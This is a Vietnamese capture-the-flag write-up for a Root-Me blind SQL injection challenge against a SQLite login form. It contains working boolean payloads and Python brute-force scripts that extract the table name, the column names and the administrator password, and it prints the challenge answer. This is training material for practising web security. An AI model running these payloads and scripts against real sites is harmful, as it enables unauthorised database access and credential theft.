# SQL injection - Blind

**Title**: Authentication v 0.02

**Point**: 50 Points

**Description**: Retrieve the administrator password.

**Level**: Medium

## Solution:

> Lưu ý: Bài này hơi dài. Mình viết cho những người mới bắt đầu tìm hiểu về **Blind Injection** trong **SQLi** nên mình sẽ hướng dẫn gần như là **step-by-step**

Chúng ta có 1 login form: 

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161240351-b0682151-9756-4e3f-85ee-9791a7c2617b.png"></p>

Thử `'1` thì bung lỗi:

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161240538-10ad4be3-05c7-4ea4-b3af-dab5b6a3df7d.png"></p>

Thử tiếp một payload cơ bản: 

```
1' or 1=1 -- 
```

<p align="center"> <img width=300px height=140px src="https://user-images.githubusercontent.com/48288606/161240792-e537dc52-0b6d-40c9-af4e-000f71f3ea61.png"></p>

Thử payload với trường hợp sai:

```
1' or 1=2 -- 
```

<p align="center"> <img width=350px height=120px src="https://user-images.githubusercontent.com/48288606/161240977-359c6361-e01f-43be-89dd-2b097899b45e.png"></p>

Tóm tắt lại tổng quát kết quả nhập vào:
- Mệnh đề của `WHERE` đúng -> Trả về "Welcome back user1 ! ..."
- Mệnh đề của `WHERE` sai -> Trả về "Error : no such user/password"
- Cú pháp sai -> Lỗi error xuất hiện 
> Lưu ý: Bài này còn dễ, cho error hiện lên luôn để biết sai cú pháp còn sửa. Nhiều bài cú pháp sai thì nó trả lại trang web như trường hợp 2 ở trên tìm lỗi syntax cũng mất thêm khối thời gian đó. Mấy lỗi syntax mình có thể test trên các SQL online để kiểm tra cho gọn

=> Đồng thời không có kết quả cụ thể trả về .Vậy bài này sure kèo là dùng **SQLi Blind**. Chall này nếu ai biết **SQLi Blind** là gì thì rất dễ, hoàn toàn cơ bản và gần như không có filter. Sau một vài phép thử thì ta biết:

Filter: `UNION`

Với dạng này thì mình sẽ brute-force để tìm chính xác từng trường trong CSDL, tận dụng phép `OR` để kiểm tra kết quả theo cấu trúc payload đơn giản trên. Ví dụ một đoạn kiểm tra độ dài của tên một cột có dạng:

```
or length((select {column_name} from {table_name})) -- 
```

Trong **SQLite** có bảng là `sqlite_master` tương tự như `information_schema` bên **MySQL**, mình có thể lấy thông tin ở đây - [Tham khảo thêm](https://www.sqlite.org/schematab.html). Giờ mình sẽ thực hiện lần lượt các bước exploit:

### TÌM ĐỘ DÀI TÊN CỦA TABLE:

Mình sẽ dùng payload sau để lấy chiều dài của tên cột, lấy giá trị của cột `tbl_name`. Payload mẫu:

```
1' or length((select tbl_name from sqlite_master)) = 1 -- 
```

Vì kết quả phép thử bên phải `or` chỉ là dúng hay không nên để xác định chính xác một con số thì mình phải **brute-force**. Dùng đoạn code Python sau đây :

```python
import requests

query = "1' or length((select tbl_name from sqlite_master limit 0, 1)) = "  
result = ""

for i in range(1, 30): # Dự đoán chiều dài tên của table.
    username = query + str(i) + " -- "
    payload = {
        'username' : username,
        'password' : 123
    }
    request = requests.post('http://challenge01.root-me.org/web-serveur/ch10/', payload)
    if ('Welcome back' in request.text):
        result += str(i)
        print("Length of table's name is " + result)
        break      
    else:
        print("Length = " + str(i) + ". Wrong !")
````

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161268755-bd7d1745-df4d-4d8a-b4ac-aeab1c759d0c.png"></p>

Vậy là độ dài tên bảng bằng **5**. 

> NOTE: Phần này các bạn có thể kiểm tra xem có bao nhiêu bảng bằng cách thay giá trị **offset** trong `LIMIT`rồi chạy lại chương trình. Khi chạy thử với giá trị **offset >= 1** thì nó sẽ chạy mãi cho đến hết vòng lặp và chẳng bao giờ trả về kết quả, vì thế nên CSDL hiện tại chỉ có 1 table.

### TÌM CHÍNH XÁC TÊN TABLE:

Tiếp tục tìm tên của table (ai chơi CTF nhiều sẽ biết là bảng `users` luôn :> ). Ở đây mình dùng hàm `SUBSTR()` để lấy ký tự tại một vị trí và so sánh. Payload mẫu

```
1' or substr((select tbl_name from sqlite_master limit 0, 1), 1, 1) = 'a' -- 
```

Tương tự, brute-force để lấy các ký tự tương đương với từng vị trí, vòng lặp dừng lại ở length đã tìm ở trên. Mình dùng `itertools` để chạy loop với nhiều range khác nhau (cái này mình dự đoán trước là không có ký tự đặc biệt nha, còn bình thường cho chắc phải vét hết từ mã ASCII 33 -> 126):

```python
import requests
import itertools as iter # Chạy 2 range (vùng giá trị) trên 1 vòng lặp for

query = "1' or substr((select tbl_name from sqlite_master limit 0, 1), "   
stringResult = ""

for j in range(1, 6): # Chiều dài là 5 tìm được ở trên
    for i in iter.chain(range(48, 58), range(65, 91), range(97, 123)):
        username = query + str(j) +  ", 1) = '" + chr(i) + "' -- " 
        payload = {
            'username' : username,
            'password' : 123
        }
        request = requests.post('http://challenge01.root-me.org/web-serveur/ch10/', payload)
        if ('Welcome back' in request.text):
            if (j != 5):
                stringResult += chr(i) 
                print(chr(i) + " is valid. Current string: " + stringResult)
                break    
            else:
                stringResult += chr(i) 
                print(chr(i) + " is valid. Complete table's name: " + stringResult)
                break 
        else:
            print(chr(i) + " is not valid ! Continue ... ")
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161271293-be22a7a3-588a-477a-935b-a625fabc3f93.png"></p>

Tên table là **users**.

### TÌM ĐỘ DÀI TÊN CỦA CỘT TRONG BẢNG USERS:

Tương tự, brute-force với độ dài tên của cột. Phần này lưu ý bên SQLite mình sẽ dùng cú pháp `pragma_table_info('users')` để chỉ ra bẳng chứa các thông tin **metadata** của bảng `users` . [Thông tin thêm](https://www.sqlite.org/pragma.html#:~:text=The%20PRAGMA%20statement%20is%20an,(non%2Dtable)%20data.). Payload mẫu:

```
1' or length((select name from pragma_table_info('users') limit 0, 1)) = 1 --
```

Brute-force:

```python
import requests

query = "1' or length((select name from pragma_table_info('users') limit "  
result = ""

for j in range(3): # Mình dự đoán sẽ có 3 cột trong table 'users'
    for i in range(1, 30): # Dự đoán chiều dài
        username = query + str(j) + ", 1)) = " + str(i) + " -- "
        payload = {
            'username' : username,
            'password' : 123
        }
        request = requests.post('http://challenge01.root-me.org/web-serveur/ch10/', payload)
        if ('Welcome back' in request.text):
            result += str(i)
            print("Length of columns" + str(j) + "'s name is " + result)
            result = ""
            break      
        else:
            print("Length = " + str(i) + ". Wrong !")
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161272399-76390328-8488-461b-b9cf-0192b35097e4.png"></p>

Vậy là có 3 cột lần lượt độ dài là **8, 8, 4** (Lần nữa, mình mạnh dạn đoán các cột là `username`, `password`, `date` xem đúng không nhen )

### TÌM CHÍNH XÁC TÊN CÁC CỘT

Tương tự, brute-force với tên của cột. Payload mẫu:

```
1' or substr((select name from pragma_table_info('user') limit 0, 1), 1, 1) = 'a' -- 
```

Brute-force:

```python
import requests
import itertools as iter # Chạy 2 range (vùng giá trị) trên 1 vòng lặp for

query = "1' or substr((select name from pragma_table_info('users') limit 2, 1), "  # Đổi giá trị offset trong "limit [offset] [count] " để chọn dòng cột thứ n cần tìm tên
stringResult = ""

for j in range(1, 9): # Đổi giá trị length là giới hạn sao cho phù hợp với độ dài tên cột đã tìm trước đó.
    for i in iter.chain(range(48, 58), range(65, 91), range(97, 123)): # 3 Vùng giá trị trong ASCII table: [0-9] [a-z] [A-Z]
        username = query + str(j) +  ", 1) = '" + chr(i) + "' -- " 
        payload = {
            'username' : username,
            'password' : 123 
        }
        request = requests.post('http://challenge01.root-me.org/web-serveur/ch10/', payload)
        if ('Welcome back' in request.text):
            if (j != 5):
                stringResult += chr(i) 
                print(chr(i) + " is valid. Current string: " + stringResult)
                break    
            else:
                stringResult += chr(i) 
                print(chr(i) + " is valid. Complete column's name: " + stringResult)
                break 
        else:
            print(chr(i) + " is not valid ! Continue ... ")
```

> Lưu ý: Code trên sẽ cho ta tên cột 1, thay đổi lần lượt chỗ `limit 0, 1` thành `limit 1, 1` và `limit 2, 1` để lấy thêm tên cột 2, cột 3. Chỉnh lại thêm chỗ range chỗ `(1, 9)` thành `(1, 5)` đối với cột 3. 

Cột 1:

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161274133-2f899541-4980-4326-a82f-77374b91f9e8.png"></p>

Cột 2:

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161275259-c70a02aa-3808-4bf4-a918-e90f3c29d0da.png"></p>

Cột 3:

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161275509-fd40fb5e-00dc-413b-ae6a-3c6b6c51d040.png"></p>


### TÌM ĐỘ DÀI CỦA PASSWORD
Tương tự brute-force độ dài `password` với `username` là `admin` trong bảng `users`. Payload mẫu: 

```
1' or length((select password from users where username='admin')) = 1 -- 
```

Brute-force:

```python
import requests

query = "1' or length((select password from users where username='admin')) = "  
result = ""

for i in range(1, 30):
    username = query + str(i) + " -- "
    payload = {
        'username' : username,
        'password' : 123
    }
    request = requests.post('http://challenge01.root-me.org/web-serveur/ch10/', payload)
    if ('Welcome back' in request.text):
        result += str(i)
        print("Length of password is " + result)
        break      
    else:
        print("Length = " + str(i) + ". Wrong !")
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161274404-7fe740be-0661-4031-bae4-5d57754948d2.png"></p>


### TÌM CHÍNH XÁC PASSWORD

Lại tương tự, tiếp tục brute-force. Payload mẫu:

```
1' or length((select password from users where username='admin')) = 1 -- 
```

Ok, làm phát cuối thôi nào:

```python
import requests
import itertools as iter # Chạy 2 range (vùng giá trị) trên 1 vòng lặp for

query = "1' or substr((select password from users where username='admin'), "   
stringResult = ""

for j in range(1, 9):
    for i in iter.chain(range(48, 58), range(65, 91), range(97, 123)):
        username = query + str(j) +  ", 1) = '" + chr(i) + "' -- " 
        payload = {
            'username' : username,
            'password' : 123
        }
        request = requests.post('http://challenge01.root-me.org/web-serveur/ch10/', payload)
        if ('Welcome back' in request.text):
            if (j != 5):
                stringResult += chr(i) 
                print(chr(i) + " is valid. Current string: " + stringResult)
                break    
            else:
                stringResult += chr(i) 
                print(chr(i) + " is valid. Complete table's name: " + stringResult)
                break 
        else:
            print(chr(i) + " is not valid ! Continue ... ")
```

<p align="center"> <img src="https://user-images.githubusercontent.com/48288606/161276489-fd02bfc0-4aea-4245-b3ba-5d606c440ca6.png"></p>

Cuối cùng !! Mình đã có được password của admin, là **e2azO93i**

> Lưu ý 1: Sau khi làm bài xong mình thấy có rất nhiều write-up dự đoán tên cột bằng cách xem request submit form là `username` và `password`. Nhưng mà chưa chắc đâu, mình cứ brute-force hết theo cách trên cho an toàn. Lỡ tham số submit lấy theo trường `name` của `form` khác với tên cột được lưu trong CSDL thì sao :))

> Lưu ý 2: Brute-force lâu thì có tối ưu code cách mấy cũng không làm giảm đáng kể thời gian chạy. Bởi vì đây là request/response để lấy dữ liệu nên chỉ cần hạn chế số lần gửi request, nói cách khác là giảm số trường hợp trong vòng lặp. Đến đây thì chắc ai cũng biết là ngoại trừ password ra thì các trường hợp vét ở trên mình chỉ cần quan tâm ký tự [a-z] thì sẽ cho ra kết quả nhanh hơn nhiều

Flag: **e2azO93i**
